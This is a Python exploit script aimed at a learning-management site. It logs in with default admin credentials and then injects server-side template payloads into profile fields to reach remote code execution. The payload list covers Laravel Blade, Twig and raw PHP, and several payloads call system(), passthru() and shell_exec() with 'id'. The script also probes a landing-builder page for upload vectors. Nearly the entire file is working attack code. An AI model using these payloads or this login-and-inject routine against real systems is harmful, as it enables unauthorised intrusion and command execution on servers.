import requests
import re
import time

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in as Admin...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login failed.")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def get_csrf(url):
    try:
        r = session.get(url)
        match = re.search(r'name="_token" value="([^"]+)"', r.text)
        if match:
            return match.group(1), r.text
        return None, r.text
    except:
        return None, ""

def test_ssti_payload(payload, description=""):
    """Test SSTI payload in profile/bio field"""
    csrf, _ = get_csrf(f"{BASE_URL}/panel/setting")
    
    data = {
        '_token': csrf,
        'about': payload,
        'bio': payload,
    }
    
    try:
        r = session.post(f"{BASE_URL}/panel/setting", data=data, allow_redirects=True)
        
        # Check where the payload appears
        check = session.get(f"{BASE_URL}/panel/setting")
        
        return check.text
    except Exception as e:
        return str(e)

def exploit_ssti_rce():
    """Exploit SSTI to achieve RCE"""
    print("\n[*] Exploiting SSTI for RCE...")
    
    # Test payloads for different template engines
    rce_payloads = [
        # Blade (Laravel)
        ("{{system('id')}}", "Blade system()"),
        ("{!! system('id') !!}", "Blade unescaped system()"),
        ("@php system('id'); @endphp", "Blade @php directive"),
        ("{{`id`}}", "Blade backtick execution"),
        ("{{passthru('id')}}", "Blade passthru()"),
        ("{{shell_exec('id')}}", "Blade shell_exec()"),
        
        # Twig (if used)
        ("{{_self.env.registerUndefinedFilterCallback('exec')}}", "Twig callback setup"),
        ("{{_self.env.getFilter('id')}}", "Twig filter exec"),
        ("{{['id']|filter('system')}}", "Twig filter system"),
        
        # Generic PHP
        ("<?php system('id'); ?>", "Raw PHP"),
        ("<?=`id`?>", "Short PHP tag"),
    ]
    
    for payload, desc in rce_payloads:
        print(f"\n[*] Testing: {desc}")
        print(f"    Payload: {payload}")
        
        result = test_ssti_payload(payload)
        
        # Check for command output indicators
        if "uid=" in result and ("www-data" in result or "apache" in result or "root" in result):
            print(f"\n[!!!] RCE SUCCESS!")
            print(f"[!!!] Working payload: {payload}")
            
            # Extract the output
            match = re.search(r'(uid=\d+[^\<\n]+)', result)
            if match:
                print(f"[!!!] Output: {match.group(1)}")
            return True
        elif "49" in result and payload == "{{7*7}}":
            print("    [+] SSTI confirmed (7*7=49)")
        else:
            # Check if payload was reflected or processed
            if payload in result:
                print("    [-] Payload reflected but not executed")
            else:
                print("    [?] Payload processed/filtered")
    
    return False

def exploit_via_landing_builder():
    """Try RCE via Landing Builder which has upload functionality"""
    print("\n[*] Attempting RCE via Landing Builder...")
    
    csrf, page = get_csrf(f"{BASE_URL}/admin/landing-builder/1/edit")
    
    # Look for file upload or content fields
    file_inputs = re.findall(r'name=["\']([^"\']+)["\']', page)
    print(f"    Found fields: {[f for f in file_inputs if 'content' in f.lower() or 'image' in f.lower()][:10]}")
    
    # Check for rich text editors or code input
    if 'tinymce' in page.lower() or 'ckeditor' in page.lower() or 'codemirror' in page.lower():
        print("    [!] Rich text editor detected")
    
    # Look for action URL
    actions = re.findall(r'action=["\']([^"\']+)["\']', page)
    if actions:
        print(f"    Form actions: {actions[:3]}")
    
    return False

def main():
    if not login():
        return
    
    # First verify SSTI exists
    print("\n[*] Verifying SSTI vulnerability...")
    result = test_ssti_payload("{{7*7}}")
    if "49" in result:
        print("[+] SSTI CONFIRMED! {{7*7}} = 49 found in response")
        
        # Try to escalate to RCE
        if exploit_ssti_rce():
            print("\n[+] RCE exploitation successful!")
            return
        else:
            print("\n[-] SSTI confirmed but RCE payloads were blocked/filtered")
    else:
        print("[-] SSTI not detected in this test")
    
    # Try other vectors
    exploit_via_landing_builder()
    
    print("\n[*] Exploitation attempts complete.")

if __name__ == "__main__":
    main()
